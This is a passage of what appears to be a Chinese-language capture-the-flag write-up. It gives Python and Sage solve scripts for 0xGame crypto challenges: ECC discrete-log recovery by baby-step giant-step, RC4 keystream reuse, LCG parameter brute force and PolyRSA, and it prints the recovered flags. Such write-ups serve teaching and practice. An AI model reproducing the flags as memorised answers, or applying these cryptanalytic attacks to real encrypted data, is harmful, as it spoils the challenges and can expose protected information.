current</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    res = res + current</span><br><span class=\"line\">            current = current + current <span class=\"comment\"># 点倍增</span></span><br><span class=\"line\">            s &gt;&gt;= <span class=\"number\">1</span> <span class=\"comment\"># 右移一位</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 定义点的相等性</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__eq__</span>(<span class=\"params\">self, other</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> other <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span>.x == other.x <span class=\"keyword\">and</span> <span class=\"variable language_\">self</span>.y == other.y</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 为了能将 Point 对象作为字典的键，需要定义 __hash__</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__hash__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">hash</span>((<span class=\"variable language_\">self</span>.x, <span class=\"variable language_\">self</span>.y))</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 定义点的相反数</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__neg__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> Point(<span class=\"variable language_\">self</span>.x, -<span class=\"variable language_\">self</span>.y % <span class=\"variable language_\">self</span>.p)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 方便打印</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__repr__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">f&quot;(<span class=\"subst\">&#123;self.x&#125;</span>, <span class=\"subst\">&#123;self.y&#125;</span>)&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"><span class=\"comment\"># 第二部分：实现并运行大步小步法 (BSGS) 来找到 s</span></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bsgs</span>(<span class=\"params\">base_point, target_point, search_limit</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    使用大步小步法求解椭圆曲线离散对数问题 (s * base_point = target_point)</span></span><br><span class=\"line\"><span class=\"string\">    :param base_point: 基点 P</span></span><br><span class=\"line\"><span class=\"string\">    :param target_point: 目标点 Q</span></span><br><span class=\"line\"><span class=\"string\">    :param search_limit: s 的最大搜索范围 (2^40)</span></span><br><span class=\"line\"><span class=\"string\">    :return: 整数 s</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\">    m = <span class=\"built_in\">int</span>(math.sqrt(search_limit)) + <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;步长 (m) 设置为: <span class=\"subst\">&#123;m&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 1. 计算小步 (Baby Steps) 并存入哈希表</span></span><br><span class=\"line\">    baby_steps_table = &#123;&#125;</span><br><span class=\"line\">    current_point = <span class=\"literal\">None</span> <span class=\"comment\"># 0 * P</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_point <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> baby_steps_table:</span><br><span class=\"line\">            baby_steps_table[current_point] = j</span><br><span class=\"line\">        <span class=\"keyword\">if</span> current_point <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            current_point = base_point</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            current_point = current_point + base_point</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;小步表已生成完成。&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 2. 计算大步的步进 (mP)</span></span><br><span class=\"line\">    mP = base_point * m</span><br><span class=\"line\">    mP_inv = -mP</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 3. 计算大步 (Giant Steps) 并查找匹配</span></span><br><span class=\"line\">    giant_step_point = target_point</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(m):</span><br><span class=\"line\">        <span class=\"comment\"># 查找 Q - i*m*P 是否在小步表中</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> giant_step_point <span class=\"keyword\">in</span> baby_steps_table:</span><br><span class=\"line\">            j = baby_steps_table[giant_step_point]</span><br><span class=\"line\">            s = i * m + j</span><br><span class=\"line\">            <span class=\"comment\"># 由于0*P和负点的情况，可能需要微调</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> base_point * s == target_point:</span><br><span class=\"line\">                 <span class=\"keyword\">return</span> s</span><br><span class=\"line\">        giant_step_point = giant_step_point + mP_inv</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">None</span> <span class=\"comment\"># 没有找到解</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"><span class=\"comment\"># 第三部分：整合并执行解密</span></span><br><span class=\"line\"><span class=\"comment\"># ===============================================================</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 题目中给出的 P 和 Q 的坐标</span></span><br><span class=\"line\">    P_coords = (<span class=\"number\">96072097493962089165616681758527365503518618338657020069385515845050052711198</span>, <span class=\"number\">106207812376588552122608666685749118279489006020794136421111385490430195590894</span>)</span><br><span class=\"line\">    Q_coords = (<span class=\"number\">100307267283773399335731485631028019332040775774395440323669585624446229655081</span>, <span class=\"number\">22957963484284064705317349990185223707693957911321089428005116099172185773154</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 创建 Point 对象</span></span><br><span class=\"line\">    P = Point(P_coords[<span class=\"number\">0</span>], P_coords[<span class=\"number\">1</span>])</span><br><span class=\"line\">    Q = Point(Q_coords[<span class=\"number\">0</span>], Q_coords[<span class=\"number\">1</span>])</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># s 的最大值是 2^40</span></span><br><span class=\"line\">    search_space = <span class=\"number\">2</span>**<span class=\"number\">40</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;正在使用大步小步法计算私钥 s，这可能需要一分钟左右...&quot;</span>)</span><br><span class=\"line\">    s = bsgs(P, Q, search_space)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> s <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;成功找到私钥 s: <span class=\"subst\">&#123;s&#125;</span>\\n&quot;</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 使用找到的 s 进行解密</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;正在使用 s 生成密钥并解密...&quot;</span>)</span><br><span class=\"line\">        key = sha256(<span class=\"built_in\">str</span>(s).encode()).digest()</span><br><span class=\"line\">        </span><br><span class=\"line\">        ciphertext = <span class=\"string\">b&#x27;:\\xe5^\\xd2s\\x92kX\\x96\\x12\\xb7dT\\x1am\\x94\\x86\\xcd.\\x84*-\\x93\\xb5\\x14\\x8d\\x99\\x94\\x92\\xfaCE\\xbd\\x01&amp;?\\xe1\\x01f\\xef\\x8f\\xe3\\x13\\x13\\x96\\xa6\\x0f\\xc0&#x27;</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        cipher = AES.new(key, AES.MODE_ECB)</span><br><span class=\"line\">        </span><br><span class=\"line\">        decrypted_padded = cipher.decrypt(ciphertext)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># 去除 PKCS7 填充</span></span><br><span class=\"line\">        padding_len = decrypted_padded[-<span class=\"number\">1</span>]</span><br><span class=\"line\">        flag = decrypted_padded[:-padding_len]</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span> + <span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;解密成功！ Flag 是: <span class=\"subst\">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> UnicodeDecodeError:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;解密成功！ Flag (原始字节): <span class=\"subst\">&#123;flag&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;=&quot;</span>*<span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;未能找到 s。&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>得到<img src=\"C:\\Users\\ASUS\\AppData\\Roaming\\Typora\\typora-user-images\\image-20251009211926304.png\" alt=\"image-20251009211926304\"></p>\n<p>flag:<code>0xgame&#123;ECC_1s_4w3s0m3_but_n0t_perf3ct&#125;</code></p>\n<h2 id=\"流密码\"><a href=\"#流密码\" class=\"headerlink\" title=\"流密码\"></a>流密码</h2><p>已知加密key的明文是key*5,加密flag是32字节，所以msg也是32字节。两个密文是同一个RC4密钥加密的，我们可以求出密钥流的前32字节:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keystream = ciphertext_key[:<span class=\"number\">32</span>] ⊕ P2[:<span class=\"number\">32</span>]</span><br></pre></td></tr></table></figure>\n\n<p>然后用该密钥就能求出msg：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msg = ciphertext_flag ⊕ keystream</span><br></pre></td></tr></table></figure>\n\n<p>完整解密脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ciphertext_flag = <span class=\"string\">b&#x27;n\\xab\\xa8\\xf6%\\xf5\\xbd\\xc5\\x97\\xe0\\xa0zCpV&#123;\\x04&amp;\\x8a\\xe5\\xe1TP\\xe0&#x27;</span></span><br><span class=\"line\">ciphertext_key = <span class=\"string\">b&#x27;\\x83=x&#123;\\xbcb\\r^3nl\\xbe\\xf4\\xdb\\xe5\\xc5\\x86\\x9e-Rt\\xf9\\x93\\t\\x883I\\xdd\\xcdx\\x01&quot;\\xb6d\\xd3A\\xa47|\\x8d\\xf8\\xe9\\xb1\\x04\\xfaz\\x83t\\xd5\\x85\\xd19\\xfd\\xbc\\x88\\xc8\\x05fJZ\\xae\\xba%\\x04B\\xd6a&gt;\\xf7\\xc6B\\xc0`\\xc2\\xc4\\x10\\x83BbJ&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">key_known = <span class=\"string\">b&quot;This is keyyyyyy&quot;</span> * <span class=\"number\">5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取前 32 字节</span></span><br><span class=\"line\">key_part = key_known[:<span class=\"number\">32</span>]</span><br><span class=\"line\">cipher_key_part = ciphertext_key[:<span class=\"number\">32</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">keystream = <span class=\"built_in\">bytes</span>(a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(cipher_key_part, key_part))</span><br><span class=\"line\"></span><br><span class=\"line\">msg = <span class=\"built_in\">bytes</span>(a ^ b <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(ciphertext_flag, keystream))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;msg =&quot;</span>, msg)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(msg.decode(<span class=\"string\">&#x27;gbk&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>后面发现这居然是GBK编码 ( ?   于是加了这一行<code>print(msg.decode(&#39;gbk&#39;))</code>，得到flag：<code>0xGame&#123;哈哈哈没想到我是中文的吧&#125;</code></p>\n<h2 id=\"LCG\"><a href=\"#LCG\" class=\"headerlink\" title=\"LCG\"></a>LCG</h2><p>RNG&#x3D;1，得到<code>Encrypted flag: [1935545177, 482262980, 1684118578, 997149554, 47161616, 102144924, 4155440928, 2213608845, 3538556139, 2928111657, 1154771317, 2133944243, 4148979403, 858055706, 3202218392, 1727302179, 3882966344, 1327689887, 3674970320, 2187841171, 2311252450, 482971802, 1729193547, 358579918, 927519716, 1913893602, 1846075319, 1560219121, 3400251736, 2548802464, 684657754, 989524061, 324600525, 197683993, 1609214168, 3772472918]</code>所以flag是36字节。</p>\n<p>先找RNG状态序列：从 <code>seed=1</code> 开始迭代 RNG，直到状态重复，记录所有状态序列 <code>states</code>。</p>\n<p>枚举a和b：因为 <code>a</code> 和 <code>b</code> 是 <code>states[k1]</code> 和 <code>states[k2]</code>，其中 <code>k1, k2</code> 在 <code>[1, 1024]</code> 范围内（因为 <code>random.randint(1, 1024)</code>），所以取 <code>a = states[i]</code>, <code>b = states[j]</code>，其中 <code>i</code> 和 <code>j</code> 从 1 到 min(1024, len(states))</p>\n<p>完整exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> inverse</span><br><span class=\"line\"></span><br><span class=\"line\">MOD = <span class=\"number\">2</span>**<span class=\"number\">32</span> + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">coefficients = [<span class=\"number\">77549</span>, <span class=\"number\">468297</span>, <span class=\"number\">447715</span>, <span class=\"number\">99019</span>, <span class=\"number\">1039399</span>, <span class=\"number\">618114</span>, <span class=\"number\">67952</span>, <span class=\"number\">512021</span>, <span class=\"number\">390981</span>, <span class=\"number\">412152</span>]</span><br><span class=\"line\">enc_flag = [<span class=\"number\">1935545177</span>, <span class=\"number\">482262980</span>, <span class=\"number\">1684118578</span>, <span class=\"number\">997149554</span>, <span class=\"number\">47161616</span>, <span class=\"number\">102144924</span>, <span class=\"number\">4155440928</span>, <span class=\"number\">2213608845</span>, <span class=\"number\">3538556139</span>, <span class=\"number\">2928111657</span>, <span class=\"number\">1154771317</span>, <span class=\"number\">2133944243</span>, <span class=\"number\">4148979403</span>, <span class=\"number\">858055706</span>, <span class=\"number\">3202218392</span>, <span class=\"number\">1727302179</span>, <span class=\"number\">3882966344</span>, <span class=\"number\">1327689887</span>, <span class=\"number\">3674970320</span>, <span class=\"number\">2187841171</span>, <span class=\"number\">2311252450</span>, <span class=\"number\">482971802</span>, <span class=\"number\">1729193547</span>, <span class=\"number\">358579918</span>, <span class=\"number\">927519716</span>, <span class=\"number\">1913893602</span>, <span class=\"number\">1846075319</span>, <span class=\"number\">1560219121</span>, <span class=\"number\">3400251736</span>, <span class=\"number\">2548802464</span>, <span class=\"number\">684657754</span>, <span class=\"number\">989524061</span>, <span class=\"number\">324600525</span>, <span class=\"number\">197683993</span>, <span class=\"number\">1609214168</span>, <span class=\"number\">3772472918</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">RNG</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, coefficients, seed, MOD=<span class=\"number\">2</span>**<span class=\"number\">20</span></span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.coefficients = coefficients</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.state = seed</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.MOD = MOD</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.f = <span class=\"keyword\">lambda</span> x: <span class=\"built_in\">sum</span>(c * (x ** i) <span class=\"keyword\">for</span> i, c <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(coefficients)) % MOD</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">next</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"variable language_\">self</span>.state = <span class=\"variable language_\">self</span>.f(<span class=\"variable language_\">self</span>.state)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable language_\">self</span>.state</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 生成 RNG 状态序列（足够长，比如 5000 个状态，确保覆盖循环）</span></span><br><span class=\"line\">seed = <span class=\"number\">1</span></span><br><span class=\"line\">rng = RNG(coefficients, seed)</span><br><span class=\"line\">states = [seed]</span><br><span class=\"line\"><span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">5000</span>):</span><br><span class=\"line\">    nxt = rng.<span class=\"built_in\">next</span>()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> nxt == states[<span class=\"number\">0</span>]:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    states.append(nxt)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Generated <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(states)&#125;</span> unique RNG states&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 枚举 a 和 b 的可能值（索引从 1 到 1024）</span></span><br><span class=\"line\">found = <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">min</span>(<span class=\"number\">1025</span>, <span class=\"built_in\">len</span>(states))):</span><br><span class=\"line\">    a = states[i]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> gcd(a, MOD) != <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    inv_a = inverse(a, MOD)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"built_in\">min</span>(<span class=\"number\">1025</span>, <span class=\"built_in\">len</span>(states))):</span><br><span class=\"line\">        b = states[j]</span><br><span class=\"line\">        plain = []</span><br><span class=\"line\">        <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> enc_flag:</span><br><span class=\"line\">            possible_byte = <span class=\"literal\">None</span></span><br><span class=\"line\">            state_val = c</span><br><span class=\"line\">            <span class=\"comment\"># 反向 1 到 1024 步</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> step <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">1025</span>):</span><br><span class=\"line\">                state_val = (state_val - b) * inv_a % MOD</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"number\">0</span> &lt;= state_val &lt;= <span class=\"number\">255</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> possible_byte <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                        possible_byte = state_val</span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        <span class=\"comment\"># 如果多个步数都得到合法字节，需要选择，这里先取第一个</span></span><br><span class=\"line\">                        <span class=\"comment\"># 实际上应该检查一致性，我们先简单处理</span></span><br><span class=\"line\">                        <span class=\"keyword\">pass</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> possible_byte <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            plain.append(possible_byte)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(plain) == <span class=\"built_in\">len</span>(enc_flag):</span><br><span class=\"line\">            <span class=\"comment\"># 检查是否可打印 ASCII</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                text = <span class=\"built_in\">bytes</span>(plain).decode(<span class=\"string\">&#x27;ascii&#x27;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"built_in\">all</span>(<span class=\"number\">32</span> &lt;= p &lt; <span class=\"number\">127</span> <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> plain):</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Found: a=<span class=\"subst\">&#123;a&#125;</span>, b=<span class=\"subst\">&#123;b&#125;</span>, plaintext = <span class=\"subst\">&#123;text&#125;</span>&quot;</span>)</span><br><span class=\"line\">                    found = <span class=\"literal\">True</span></span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> found:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"keyword\">not</span> found:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Not found with given constraints.&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"PolyRSA\"><a href=\"#PolyRSA\" class=\"headerlink\" title=\"PolyRSA\"></a>PolyRSA</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = Integer(<span class=\"number\">211381997162225534712606028333737323293</span>)</span><br><span class=\"line\">q = Integer(<span class=\"number\">291844321073146066895055929747029949743</span>)</span><br><span class=\"line\">n = p * q</span><br><span class=\"line\">e = <span class=\"number\">65537</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义多项式环</span></span><br><span class=\"line\">Rp.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class=\"line\">Rq.&lt;x&gt; = PolynomialRing(GF(q))</span><br><span class=\"line\">Rn.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义模 x^8 - 1</span></span><br><span class=\"line\">Sp = Rp.quotient(x^<span class=\"number\">8</span> - <span class=\"number\">1</span>, <span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">Sq = Rq.quotient(x^<span class=\"number\">8</span> - <span class=\"number\">1</span>, <span class=\"string\">&#x27;b&#x27;</span>)</span><br><span class=\"line\">Sn = Rn.quotient(x^<span class=\"number\">8</span> - <span class=\"number\">1</span>, <span class=\"string\">&#x27;c&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 密文多项式系数</span></span><br><span class=\"line\">c_coeffs = [<span class=\"number\">40882135200347703593754473549436673146387957409540306808209934514868940052992</span>,</span><br><span class=\"line\">            <span class=\"number\">13673861744940819052324430973254902841262867940443611208276249322420769352299</span>,</span><br><span class=\"line\">            <span class=\"number\">14825937682750201471490037222143248112539971745568733623844924679519292569979</span>,</span><br><span class=\"line\">            <span class=\"number\">38679688295547579683397975810830690182925250157203662993481664387755200460738</span>,</span><br><span class=\"line\">            <span class=\"number\">48188456496545346035512990878010917911654453288374940837147218298761674630209</span>,</span><br><span class=\"line\">            <span class=\"number\">573073037892837477865699910635548796182825197336726898256762153949994844160</span>,</span><br><span class=\"line\">            <span class=\"number\">33191976337303879621137795936787377133622652419928253776624421127421475322069</span>,</span><br><span class=\"line\">            <span class=\"number\">46680445255028101113817388282005859237776046219558912765486646689142241483104</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">c_poly = Sn(c_coeffs)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算单位群阶</span></span><br><span class=\"line\">order_p = (p-<span class=\"number\">1</span>)^<span class=\"number\">2</span> * (p^<span class=\"number\">2</span> - <span class=\"number\">1</span>) * (p^<span class=\"number\">4</span> - <span class=\"number\">1</span>)</span><br><span class=\"line\">order_q = (q-<span class=\"number\">1</span>)^<span class=\"number\">2</span> * (q^<span class=\"number\">2</span> - <span class=\"number\">1</span>) * (q^<span class=\"number\">4</span> - <span class=\"number\">1</span>)</span><br><span class=\"line\">order = lcm(order_p, order_q)</span><br><span class=\"line\">d = inverse_mod(e, order)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 